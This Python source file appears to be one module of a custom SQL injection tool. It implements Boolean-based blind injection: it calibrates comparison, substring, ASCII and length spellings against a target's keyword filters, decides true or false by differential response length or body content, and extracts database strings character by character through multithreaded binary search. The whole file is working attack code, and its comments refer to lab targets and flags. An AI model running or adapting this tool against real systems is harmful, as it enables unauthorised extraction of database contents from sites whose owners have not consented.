# -*- coding: utf-8 -*-
"""Boolean-based blind injection (v1.1: differential decision + expression calibration + charset binary search)

Why not decide true/false by "response length > fixed threshold"?
    Many lab targets (debug mode) reflect the executed SQL back into the page,
    so the payload text itself inflates the response length -- the longer the condition, the more "true" it looks,
    and a fixed threshold simply fails.

Differential decision:
    For the same condition, also send a version whose right-hand value is an equal-length string of 9s.
    The 9s necessarily makes the condition false, and both payloads have identical length -> the reflected
    part has identical length -> only the result set remains in the length difference. Diff > 0 means true; stable for reflective and jittery targets.

v1.2: content-diff fallback
    If the target flattens the response length (uniform template / fixed-length 200 frame), the length differential above
    fails entirely -- true and false samples have identical length, so the difference is always 0.
    We then auto-switch to "response body content diff": the true sample (condition holds) reflects more content than the false one;
    compare the difference between the two response bodies with core.detector.body_diff to decide true.
    The gate is derived from baseline noise, avoiding treating page timestamps / tokens as signal.

v1.2: probe must verify the **real extraction expression**
    probe no longer looks only at a bare comparison (`2>=1` holds on any database), but requires
    calibrate() to validate all three of "comparison / code+substring / length" before accepting.
    Otherwise, when keywords are filtered or the dialect is misjudged, the tool would pick a spelling that cannot evaluate,
    judge false all the way down, and never fall back to later strategies.
"""
from concurrent.futures import ThreadPoolExecutor

from core.detector import body_diff, body_gate
from techniques.base import BaseTechnique


# Preset charsets
CHARSETS = {
    "full":  "".join(chr(i) for i in range(32, 127)),           # Printable full ASCII
    # Note: characters outside the charset are silently "snapped to the nearest character" instead of erroring.
    # E.g. if flag contains '+' (43) but the charset only goes to '*' (42) -> it reads as '*'.
    # So the flag preset must cover common symbols; don't miss + | = ~ : ; , . / ? etc.
    "flag":  "{}_-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "!@#$%^&*()+|=~:;,.<>?/",
    "hex":   "0123456789abcdef",
    "hexu":  "0123456789abcdefABCDEF",
    "alnum": "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_",
    "digit": "0123456789",
    "lower": "abcdefghijklmnopqrstuvwxyz_0123456789{}",
    "sql":   "abcdefghijklmnopqrstuvwxyz_0123456789",
}


class BooleanTechnique(BaseTechnique):
    name = "Boolean Blind"

    def __init__(self, *args, charset="full", test_votes=2, **kwargs):
        super().__init__(*args, **kwargs)
        self.charset = CHARSETS.get(charset, charset)
        if not self.charset:
            self.charset = CHARSETS["full"]
        self.charset_sorted = sorted(set(self.charset), key=ord)
        # Votes per decision. Default 2 (robust); drops to 1 only with --fast.
        # A single vote flips one character on occasional jitter; unacceptable for flags.
        self.test_votes = max(1, int(test_votes))
        # "Must-be-false sample" response length cache: see _false_len()
        self._false_len_cache = {}
        # Cache switch: temporarily disabled when a full-string verification fails and we re-extract, falling back to "live comparison each time"
        self._use_false_cache = True
        # v1.2: switch to content diff when length is indistinguishable (decided in probe() from the closing probe result)
        self._body_mode = False
        self._body_gate = body_gate(0.0)

    # ---------------- Differential decision ----------------
    def _resp_of(self, condition):
        """Send one condition request and return the full response (None on network failure / abnormal status).

        Only a "successful response" can be used for the differential decision.
        When the lab occasionally returns 4xx/5xx (backend error page, rate-limit page, DB lock wait), the response length jumps;
        once that is cached as the "false sample" baseline, the decision at that position stays biased toward false --
        the symptom being a whole run of characters read as **smaller** ones (binary search converging downward on repeated false).
        """
        payload = self._t(f"({condition})")
        final = self.det.prefix + payload + self.det.suffix
        r = self.req.send(final, use_cache=False)
        if r["status"] == -1:
            return None
        if not (200 <= r["status"] < 400):
            return None
        return r

    def _len_of(self, condition):
        r = self._resp_of(condition)
        return None if r is None else r["length"]

    def _false_len(self, left, w, fake):
        """Get the response length of the "must-be-false sample".

        Key optimization: the false sample `left>=9999` response length depends only on the **payload text length**
        (reflective targets echo the payload back verbatim), and at a given position the payload length is fixed
        (the right-hand value is always zero-padded to w digits), so it can be cached and reused once, cutting
        the requests per decision from 2 to 1.

        Enabled only when the target jitter is 0 (stable page length, no random elements);
        otherwise fall back to "live comparison each time", avoiding misjudgment from cache drift.
        """
        if not self._use_false_cache:
            return None
        if getattr(self.det, "baseline_jitter", 0) != 0:
            return None
        key = (left, w)
        if key not in self._false_len_cache:
            v = self._len_of(self.gte(left, fake))
            if v is None:
                return None          # no valid length -> don't cache, retry next time
            self._false_len_cache[key] = v
        return self._false_len_cache[key]

    def _vote(self, left, rs, fake, w, margin):
        """One vote: +1 true / -1 false / 0 uncertain"""
        a = self._len_of(self.gte(left, rs))
        b = self._false_len(left, w, fake)
        if b is None:
            b = self._len_of(self.gte(left, fake))
        if a is None or b is None:
            return 0
        d = a - b
        if d > margin:
            return 1
        if d < -margin:
            return -1
        return 0

    def _test(self, left, right):
        """Differential decision: whether gte(left, right) is true.

        The false sample's right-hand value uses an equal-width string of 9s, keeping the payload text length unchanged,
        thus canceling the length interference from "reflection/jitter".

        Key detail: the right-hand value is uniformly zero-padded to a fixed width (at least 4 digits) before comparison.
        Otherwise a 2-digit value like ord('a')=97 could only have an equal-length false sample of 99,
        while the real values 97/98 might still satisfy >=99 -> inaccurate true.

        Robustness: vote test_votes times first; if it ties (equal true/false) it indicates noise,
        so add up to 2 more votes, avoiding "one noisy + one correct = tie = false" flipping a character wrong.
        """
        try:
            rv = int(right)
        except (TypeError, ValueError):
            rv = 0
        w = max(4, len(str(abs(rv))))
        rs = str(rv).zfill(w)
        fake = "9" * w

        # v1.2: use content diff when length is indistinguishable -- the length diff is always 0, so votes don't help
        n = max(1, getattr(self, "test_votes", 2) or 2)
        if self._body_mode:
            votes = sum(1 if self._test_by_body(left, rs, fake) else -1
                        for _ in range(n))
            extra = 0
            while votes == 0 and extra < 2:
                extra += 1
                votes += 1 if self._test_by_body(left, rs, fake) else -1
            return votes > 0

        margin = max(5, getattr(self.det, "threshold", 5) or 5)

        votes = sum(self._vote(left, rs, fake, w, margin) for _ in range(n))
        extra = 0
        while votes == 0 and extra < 2:
            extra += 1
            votes += self._vote(left, rs, fake, w, margin)
        return votes > 0

    def _test_by_body(self, left, rs, fake):
        """Content-diff decision when length is indistinguishable.

        The true sample (left >= real value) reflects more content than the false sample; the false sample (left >= 9999)
        necessarily returns an empty result. If the two bodies' difference exceeds the gate, it's judged true.

        The gate comes from the baseline noise estimate during the closing probe (difference of the same payload sent 3x),
        so when the page has timestamps / random tokens the gate is automatically raised.
        """
        a = self._resp_of(self.gte(left, rs))
        b = self._resp_of(self.gte(left, fake))
        if a is None or b is None:
            return False
        return body_diff(a["text"], b["text"]) > self._body_gate

    # ---------------- Calibration ----------------
    def calibrate(self):
        """Pick a spelling still usable under the current filter (verified by differential decision).

        Returns True if all three of "comparison / code+substring / length" **pass** verification, so extraction can proceed;
        returns False if the current spellings cannot evaluate (keywords filtered, or the dialect is simply wrong).

        Why the result must be returned: probe used to accept a bare comparison (like `2>=1`) as the condition,
        and a bare comparison contains no dialect-specific functions -- so even if SUBSTR / ASCII / LENGTH
        are all filtered or error out from a dialect mismatch, probe still "passes",
        and engine goes on to blind-inject with a dead spelling: judging false all the way, extracting an empty string,
        and from then on **never falling back** to later strategies (typically stuck at "get current database").
        """
        # 1) Comparison spelling: 2>=1 true, 2>=9 false (verify both sides to stop "always-true" spellings)
        ok_gte = False
        for pat in self.GTE_PATTERNS:
            self.gte_pat = pat
            if self._test("2", "1") and not self._test("2", "9"):
                ok_gte = True
                break
        if not ok_gte:
            self.gte_pat = self.GTE_PATTERNS[0]

        # 2) Code + substring: ASCII(SUBSTR('A',1,1)) = 65 and != 66
        sub_all = self.dialect.substr_templates()
        asc_all = self.dialect.ascii_templates()
        ok_code = False
        for sub_tpl in sub_all:
            for asc_tpl in asc_all:
                self.sub_tpl, self.ascii_tpl = sub_tpl, asc_tpl
                expr = asc_tpl.format(sql=sub_tpl.format(sql="'A'", pos=1, len=1))
                if self._test(expr, "65") and not self._test(expr, "66"):
                    ok_code = True
                    break
            if ok_code:
                break
        if not ok_code:
            # All attempts failed -> reset to the default spellings.
            # Previously on failure it stopped at "the last combination tried", effectively a random pick -- pure trap.
            self.sub_tpl, self.ascii_tpl = sub_all[0], asc_all[0]

        # 3) Length: LENGTH('AB') = 2 and != 3
        len_all = self.dialect.length_templates()
        ok_len = False
        for len_tpl in len_all:
            self.len_tpl = len_tpl
            expr = len_tpl.format(sql="'AB'")
            if self._test(expr, "2") and not self._test(expr, "3"):
                ok_len = True
                break
        if not ok_len:
            self.len_tpl = len_all[0]

        return ok_gte and ok_code and ok_len

    # ---------------- Probe ----------------
    def probe(self):
        # v1.2: if the closing probe reports "True/False lengths identical", the length differential fails entirely;
        # switch straight to content diff, otherwise every subsequent decision would be constantly false.
        self._body_mode = (
            getattr(self.det, "true_len", None) is not None
            and self.det.true_len == self.det.false_len
        )
        self._body_gate = body_gate(getattr(self.det, "baseline_noise", 0.0))
        if self._body_mode:
            print("    [*] Response lengths indistinguishable -> switching to response body content diff")

        if not self.calibrate():
            # At least one of code / substring / length cannot evaluate under the current filter (or dialect).
            # Forcing it only means "judging false all the way, extracting an empty string", and it blocks later strategies;
            # so return False here and hand the choice back to engine.
            print("    [-] Current spellings cannot evaluate (keywords filtered or dialect mismatch), trying next set")
            return False

        print(f"    [+] Expressions: >=[{self.gte_pat}] "
              f"substr[{self.sub_tpl}] code[{self.ascii_tpl}] length[{self.len_tpl}]")
        return True

    # ---------------- Base-class compatibility interface ----------------
    def _cond_true(self, condition):
        """Kept for the base class / external callers (this class uses differential decision internally)."""
        r = self.req.send(self.det.build(f"({condition})"))
        if r["status"] == -1:
            return False
        mid = (self.det.true_len + self.det.false_len) / 2
        if self.det.true_len > self.det.false_len:
            return r["length"] > mid
        return r["length"] < mid

    # ---------------- Binary search ----------------
    def _binary_search_char(self, sql_expr, pos):
        """Binary-search ord(character) within the charset.

        Note that mid must **round up**: when finding "the largest ord not exceeding the target", rounding down
        makes mid always 22 when lo=22, hi=23, so lo=mid never advances -> infinite loop
        (the original buried this landmine; only specific characters trigger it).
        """
        chars = self.charset_sorted
        lo, hi = 0, len(chars) - 1
        left = self.ascii(self.sub(sql_expr, pos, 1))
        guard = 0
        while lo < hi and guard < 64:
            guard += 1
            mid = (lo + hi + 1) // 2
            if self._test(left, ord(chars[mid])):
                lo = mid
            else:
                hi = mid - 1
        return chars[lo]

    def _binary_search_length(self, sql_expr, max_len=300):
        low, high = 0, max_len
        guard = 0
        while low < high and guard < 64:
            guard += 1
            mid = (low + high) // 2
            if self._test(self.length(sql_expr), str(mid + 1)):
                low = mid + 1
            else:
                high = mid
        return low

    # ---------------- Extraction ----------------
    def extract_length(self, sql_expr):
        return self._binary_search_length(sql_expr)

    def _verify(self, sql_expr, out):
        """Whole-string equality check: `((expr)=<DBMS-specific literal>) >= 1` <=> strings are exactly equal.

        The literal must be generated per DBMS -- MySQL uses `0x..`, SQLite needs
        `CAST(x'..' AS TEXT)`, otherwise the check is constantly false (see dialect.hex_to_str).
        """
        try:
            hexed = out.encode("utf-8", "ignore").hex()
            if not hexed:
                return True
            lit = self.dialect.hex_to_str(hexed)
            return self._test(f"(({sql_expr})={lit})", "1")
        except Exception:
            return True

    def extract(self, sql_expr, _retry=False):
        length = self.extract_length(sql_expr)
        if length <= 0:
            return ""
        result = [""] * length

        def fetch(i):
            return i, self._binary_search_char(sql_expr, i)

        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            for i, c in ex.map(fetch, range(1, length + 1)):
                result[i - 1] = c
        out = "".join(result)

        # ---- Whole-string verification ----
        # When the charset is missing characters, binary search silently lands on "the nearest character not exceeding the target" (e.g. '+'->'*'),
        # which length alone cannot detect. Here a single differential decision does a whole-string comparison:
        #   In MySQL ((expr)=0x..) evaluates to 1/0, so ">=1" is equivalent to "the strings are exactly equal".
        #   Using the differential (not det.is_true) keeps it stable on reflective targets too.
        if out and not self._verify(sql_expr, out):
            if not _retry:
                # Verification failed = the result is untrustworthy. The most common cause is not the charset, but
                # an occasional response anomaly polluting the differential baseline (see the note on _len_of).
                # Handling: clear the cache + disable the cache, then re-extract once with live comparison.
                print("    [!] Whole-string verification failed, likely an occasional response anomaly polluted the differential baseline")
                print("        Clearing cache, disabling cache, re-extracting once (slower)...")
                self._false_len_cache.clear()
                self._use_false_cache = False
                try:
                    return self.extract(sql_expr, _retry=True)
                finally:
                    self._use_false_cache = True
            print("    [!] Verification still inconsistent: the result may be truncated by the charset, "
                  "please switch to a larger --charset (e.g. --charset full)")
        return out
